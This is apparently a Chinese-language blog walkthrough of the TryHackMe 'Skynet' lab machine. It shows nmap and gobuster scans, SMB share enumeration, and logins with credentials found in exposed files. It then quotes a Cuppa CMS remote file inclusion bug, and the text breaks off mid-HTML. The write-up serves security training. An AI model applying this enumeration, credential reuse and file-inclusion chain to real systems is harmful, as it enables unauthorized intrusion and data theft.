{"title":"Skynet CTF - TryHackMe.com","uid":"3a5527b898a460b8d684d86b679517ec","slug":"Skynet","date":"2022-04-12T04:09:05.512Z","updated":"2022-04-15T07:45:53.682Z","comments":true,"path":"api/articles/Skynet.json","keywords":null,"cover":"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/skynet/maxresdefault.jpg","content":"<p>Skynet是Tryhack平台上一个易受攻击的终结者主题系统。</p>\n<h1 id=\"搜集信息\"><a href=\"#搜集信息\" class=\"headerlink\" title=\"搜集信息\"></a>搜集信息</h1><p>老套路，先用<code>nmap</code>扫描靶机运行的服务端口。</p>\n<details class=\"custom-details\">\n<summary>nmap搜集信息</summary>\n<p><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">└─$ sudo nmap -sV  10.10.40.174 -T4 -oA skynet-V\nStarting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-04-14 00:21 EDT\nNmap scan report for 10.10.40.174\nHost is up (0.45s latency).\nNot shown: 994 closed tcp ports (reset)\nPORT    STATE SERVICE     VERSION\n22&#x2F;tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n80&#x2F;tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))\n110&#x2F;tcp open  pop3        Dovecot pop3d\n139&#x2F;tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n143&#x2F;tcp open  imap        Dovecot imapd\n445&#x2F;tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\nService Info: Host: SKYNET; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .\nNmap done: 1 IP address (1 host up) scanned in 19.51 seconds<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<h1 id=\"深入分析\"><a href=\"#深入分析\" class=\"headerlink\" title=\"深入分析\"></a>深入分析</h1><p><code>nmap</code>的扫描结果中存在几个常见的服务,<code>http、pop3、netbios-ssn</code>。</p>\n<h2 id=\"HTTP服务\"><a href=\"#HTTP服务\" class=\"headerlink\" title=\"HTTP服务\"></a>HTTP服务</h2><p>在浏览器打开页面,页面上存在一个搜索表单。查看网页源码发现，这个页面其实是个样子货，没有向后台发送任何数据。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/skynet/index.png\" alt=\"index\"><br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/skynet/index_code.png\" alt=\"index code\"><br>既然无法从页面上获取任何信息，我们接下来尝试枚举当前站点存在的目录，看看是否能找到被我们利用的信息。</p>\n<details class=\"custom-details\">\n<summary>gobuster 枚举目录</summary>\n<p><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">└─$ gobuster dir -u http:&#x2F;&#x2F;10.10.40.174 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n[+] Url:                     http:&#x2F;&#x2F;10.10.40.174\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster&#x2F;3.1.0\n[+] Timeout:                 10s\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n2022&#x2F;04&#x2F;13 23:58:23 Starting gobuster in directory enumeration mode\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&#x2F;.hta                 (Status: 403) [Size: 277]\n&#x2F;.htpasswd            (Status: 403) [Size: 277]\n&#x2F;.htaccess            (Status: 403) [Size: 277]\n&#x2F;admin                (Status: 301) [Size: 312] [--&gt; http:&#x2F;&#x2F;10.10.40.174&#x2F;admin&#x2F;]\n&#x2F;config               (Status: 301) [Size: 313] [--&gt; http:&#x2F;&#x2F;10.10.40.174&#x2F;config&#x2F;]\n&#x2F;css                  (Status: 301) [Size: 310] [--&gt; http:&#x2F;&#x2F;10.10.40.174&#x2F;css&#x2F;]\n&#x2F;index.html           (Status: 200) [Size: 523]\n&#x2F;js                   (Status: 301) [Size: 309] [--&gt; http:&#x2F;&#x2F;10.10.40.174&#x2F;js&#x2F;]\n&#x2F;server-status        (Status: 403) [Size: 277]\n&#x2F;squirrelmail         (Status: 301) [Size: 319] [--&gt; http:&#x2F;&#x2F;10.10.40.174&#x2F;squirrelmail&#x2F;]\n\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n2022&#x2F;04&#x2F;14 00:01:51 Finished\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<p><code>gobuster</code>枚举出了<code>/admin、/config</code>等目录，都显示403拒绝访问。只有<code>/squirrelmail</code>目录可以访问并且是一个登录界面，但是由于信息不足，我们并不能直接利用。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/skynet/squirrelMail.png\" alt=\"squirrelMail\"></p>\n<h2 id=\"NetBIOS-SSN\"><a href=\"#NetBIOS-SSN\" class=\"headerlink\" title=\"NetBIOS-SSN\"></a>NetBIOS-SSN</h2><p>从<code>nmap</code>枚举的服务中，我们看到靶机还开启了<code>netbios-ssn</code>服务。使用<code>smbmap</code>工具枚举靶机上的共享驱动器。</p>\n<div class=\"custom-quote tip\">\n<span class=\"custom-quote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M20.86 14.13C20 14.7 19.56 15.74 19.77 16.76C20.13 18.55 18.55 20.13 16.76 19.77C15.74 19.57 14.7 20 14.13 20.86C13.12 22.38 10.89 22.38 9.88 20.86C9.3 20 8.26 19.56 7.24 19.77C5.45 20.13 3.87 18.55 4.23 16.76C4.43 15.74 4 14.7 3.14 14.13C1.62 13.12 1.62 10.89 3.14 9.88C4 9.3 4.44 8.26 4.23 7.24C3.87 5.45 5.45 3.87 7.24 4.23C8.26 4.44 9.3 4 9.87 3.14C10.88 1.62 13.11 1.62 14.12 3.14C14.7 4 15.74 4.44 16.76 4.23C18.55 3.87 20.13 5.45 19.77 7.24C19.56 8.26 20 9.3 20.86 9.87C22.38 10.88 22.38 13.12 20.86 14.13Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M12.01 15C12.01 14.5 12.01 14.5 12.01 14.5C12.04 13.75 13 13.46 14.04 12.2C14.41 11.74 14.69 11.41 14.86 10.85C15.15 9.95 14.92 9.18 14.86 9.02C14.8 8.79 14.52 8 13.72 7.46C13.06 7.02 12.42 7 12.14 7C11.9 7 11.36 7 10.78 7.3C10.28 7.56 9.98 7.9 9.83 8.1C9.24 8.82 9.06 9.63 9 10.06\"></path>\n<path stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M11.99 18H12.01\"></path>\n</svg></span>\n<p class=\"custom-quote-title\">SMBMap</p>\n<p>SMBMap允许用户枚举整个域中的samba共享驱动器。用户可以使用该工具列出共享驱动器、驱动器权限、共享内容、上传&#x2F;下载功能、文件名自动下载模式匹配，甚至远程执行命令。该工具原本的设计初衷是为了简化在大型网络中搜索潜在敏感数据的过程。</p>\n\n</div>\n<details class=\"custom-details\">\n<summary>SmbMap 枚举</summary>\n<p><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">└─$ smbmap -H 10.10.185.253 -P 139\n[+] Guest session       IP: 10.10.185.253:139   Name: 10.10.185.253\n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        print$                                                  NO ACCESS       Printer Drivers\n        anonymous                                               READ ONLY       Skynet Anonymous Share\n        milesdyson                                              NO ACCESS       Miles Dyson Personal Share\n        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<p>枚举结果显示使用匿名用户可以访问的公共共享。</p>\n<details class=\"custom-details\">\n<summary>smbclient 匿名用户</summary>\n<p><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">\n└─$ smbclient --no-pass   &#x2F;&#x2F;10.10.185.253&#x2F;anonymous\nTry &quot;help&quot; to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Thu Nov 26 11:04:00 2020\n  ..                                  D        0  Tue Sep 17 03:20:17 2019\n  attention.txt                       N      163  Tue Sep 17 23:04:59 2019\n  logs                                D        0  Wed Sep 18 00:42:16 2019\n\n                9204224 blocks of size 1024. 5831460 blocks available\nsmb: \\&gt; cd logs\nsmb: \\logs\\&gt; ls\n  .                                   D        0  Wed Sep 18 00:42:16 2019\n  ..                                  D        0  Thu Nov 26 11:04:00 2020\n  log2.txt                            N        0  Wed Sep 18 00:42:13 2019\n  log1.txt                            N      471  Wed Sep 18 00:41:59 2019\n  log3.txt                            N        0  Wed Sep 18 00:42:16 2019\n\n                9204224 blocks of size 1024. 5831460 blocks available\nsmb: \\logs\\&gt; get log1.txt\ngetting file \\logs\\log1.txt of size 471 as log1.txt (0.3 KiloBytes&#x2F;sec) (average 0.3 KiloBytes&#x2F;sec)\nsmb: \\logs\\&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<p>在公共共享中，存在两个有内容的文件<code>attention.txt</code>和<code>log1.txt</code>,其中<code>attention.txt</code>内容里说明了给每个skynet员工的邮箱都发送了重置后的新密码，而<code>log1.txt</code>包含了可能被利用的密码信息。<br>综合上述的信息，我们获取到了可能用于登录<code>/squirrelmail</code>的用户名<code>milesdyson</code>和密码，尝试登录<code>/squirrelmail</code>。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/skynet/squirrelMail_login.png\" alt=\"squirrelMail login\"><br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/skynet/email.png\" alt=\"login successful\"><br>登录成功后，在第一封邮件里我们找到了重置后的新密码。</p>\n<details class=\"custom-details\">\n<summary>smbclient milesdyson</summary>\n<p><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">└─$ smbclient -U milesdyson   &#x2F;&#x2F;10.10.185.253&#x2F;milesdyson\nEnter WORKGROUP\\milesdyson&#39;s password:\nTry &quot;help&quot; to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Tue Sep 17 05:05:47 2019\n  ..                                  D        0  Tue Sep 17 23:51:03 2019\n  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019\n  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019\n  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019\n  notes                               D        0  Tue Sep 17 05:18:40 2019\n  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 05:05:14 2019\n  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 05:05:14 2019\n\n                9204224 blocks of size 1024. 5831424 blocks available\nsmb: \\&gt; cd notes\nsmb: \\notes\\&gt; ls\n  .                                   D        0  Tue Sep 17 05:18:40 2019\n  ..                                  D        0  Tue Sep 17 05:05:47 2019\n  3.01 Search.md                      N    65601  Tue Sep 17 05:01:29 2019\n  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 05:01:29 2019\n  2.08 In Practice.md                 N     7949  Tue Sep 17 05:01:29 2019\n  0.00 Cover.md                       N     3114  Tue Sep 17 05:01:29 2019\n  1.02 Linear Algebra.md              N    70314  Tue Sep 17 05:01:29 2019\n  important.txt                       N      117  Tue Sep 17 05:18:39 2019\n  6.01 pandas.md                      N     9221  Tue Sep 17 05:01:29 2019\n  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 05:01:29 2019\n  2.01 Overview.md                    N     1165  Tue Sep 17 05:01:29 2019\n  3.02 Planning.md                    N    71657  Tue Sep 17 05:01:29 2019\n  1.04 Probability.md                 N    62712  Tue Sep 17 05:01:29 2019\n  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 05:01:29 2019\n  2.00 Machine Learning.md            N       26  Tue Sep 17 05:01:29 2019\n  1.03 Calculus.md                    N    40779  Tue Sep 17 05:01:29 2019\n  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 05:01:29 2019\n  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 05:01:29 2019\n  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 05:01:29 2019\n  6.00 Appendices.md                  N       20  Tue Sep 17 05:01:29 2019\n  1.01 Functions.md                   N     7627  Tue Sep 17 05:01:29 2019\n  2.03 Neural Nets.md                 N   144726  Tue Sep 17 05:01:29 2019\n  2.04 Model Selection.md             N    33383  Tue Sep 17 05:01:29 2019\n  2.02 Supervised Learning.md         N    94287  Tue Sep 17 05:01:29 2019\n  4.00 Simulation.md                  N       20  Tue Sep 17 05:01:29 2019\n  3.05 In Practice.md                 N     1123  Tue Sep 17 05:01:29 2019\n  1.07 Graphs.md                      N     5110  Tue Sep 17 05:01:29 2019\n  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 05:01:29 2019\n  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 05:01:29 2019\n  5.03 Anonymization.md               N     2516  Tue Sep 17 05:01:29 2019\n  5.01 Process.md                     N     5788  Tue Sep 17 05:01:29 2019\n  1.09 Optimization.md                N    25823  Tue Sep 17 05:01:29 2019\n  1.05 Statistics.md                  N    64291  Tue Sep 17 05:01:29 2019\n  5.02 Visualization.md               N      940  Tue Sep 17 05:01:29 2019\n  5.00 In Practice.md                 N       21  Tue Sep 17 05:01:29 2019\n  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 05:01:29 2019\n  1.10 Algorithms.md                  N    28790  Tue Sep 17 05:01:29 2019\n  3.04 Filtering.md                   N    13360  Tue Sep 17 05:01:29 2019\n  1.00 Foundations.md                 N       22  Tue Sep 17 05:01:29 2019\n\n                9204224 blocks of size 1024. 5831424 blocks available\nsmb: \\notes\\&gt; get important.txt\ngetting file \\notes\\important.txt of size 117 as important.txt (0.1 KiloBytes&#x2F;sec) (average 0.1 KiloBytes&#x2F;sec)\nsmb: \\notes\\&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<p><code>smbclient</code>使用<code>milesdyson</code>连接成功后，在文件中发现了<code>important.txt</code>,而文件内容包含了一个测试的CMS地址<code>/45kra24zxs28v3yd</code>。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/skynet/cms.png\" alt=\"cms\"><br>这个页面上也没有可以利用的信息，不过文件中既然说是个<b>测试CMS</b>,那我们就试着枚举一下目录。</p>\n<details class=\"custom-details\">\n<summary>gobuster 枚举</summary>\n<p><pre class=\"line-numbers language-shell\" data-language=\"shell\"><code class=\"language-shell\">└─$ gobuster dir -u http:&#x2F;&#x2F;10.10.185.253&#x2F;&#x2F;45kra24zxs28v3yd -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n[+] Url:                     http:&#x2F;&#x2F;10.10.185.253&#x2F;&#x2F;45kra24zxs28v3yd\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster&#x2F;3.1.0\n[+] Timeout:                 10s\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n2022&#x2F;04&#x2F;14 12:16:21 Starting gobuster in directory enumeration mode\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&#x2F;.hta                 (Status: 403) [Size: 278]\n&#x2F;.htpasswd            (Status: 403) [Size: 278]\n&#x2F;.htaccess            (Status: 403) [Size: 278]\n&#x2F;administrator        (Status: 301) [Size: 339] [--&gt; http:&#x2F;&#x2F;10.10.185.253&#x2F;45kra24zxs28v3yd&#x2F;administrator&#x2F;]\n&#x2F;index.html           (Status: 200) [Size: 418]\nProgress: 2194 &#x2F; 4615 (47.54%)                                                                           [ERROR] 2022&#x2F;04&#x2F;14 12:18:18 [!] Get &quot;http:&#x2F;&#x2F;10.10.185.253&#x2F;&#x2F;45kra24zxs28v3yd&#x2F;infraction&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)\nProgress: 3009 &#x2F; 4615 (65.20%)                                                                           [ERROR] 2022&#x2F;04&#x2F;14 12:19:00 [!] Get &quot;http:&#x2F;&#x2F;10.10.185.253&#x2F;&#x2F;45kra24zxs28v3yd&#x2F;packages&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)\nProgress: 4221 &#x2F; 4615 (91.46%)                                                                           [ERROR] 2022&#x2F;04&#x2F;14 12:20:06 [!] Get &quot;http:&#x2F;&#x2F;10.10.185.253&#x2F;&#x2F;45kra24zxs28v3yd&#x2F;torrents&quot;: context deadline exceeded (Client.Timeout exceeded while awaiting headers)\n\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n2022&#x2F;04&#x2F;14 12:20:32 Finished\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<p>枚举目录后，我们有了新的发现，这个路径下存在<code>/administrator</code>，打开后，我们发现了<code>Cuppa CMS</code>的登录界面。<br><img src=\"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/CTF/tryhackme/skynet/cuppa_cms.png\" alt=\"cuppa cms\"></p>\n<h1 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h1><p>根据CMS的名称我们查到了<a href=\"https://www.exploit-db.com/exploits/25971\">Cuppa CMS File Inclusion</a>漏洞。</p>\n<details class=\"custom-details\">\n<summary>Cuppa CMS File Inclusion</summary>\n<p>漏洞原因<code>/alerts/alertConfigField.php (LINE: 22)</code>, 允许攻击者执行远程PHP文件。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"urlConfig\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>而且可以利用PHPStream读取<code>Configuration.php</code>的源代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"># Base64 Decode Output:\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n\t<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Configuration</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$host</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"localhost\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">public</span> <span class=\"token 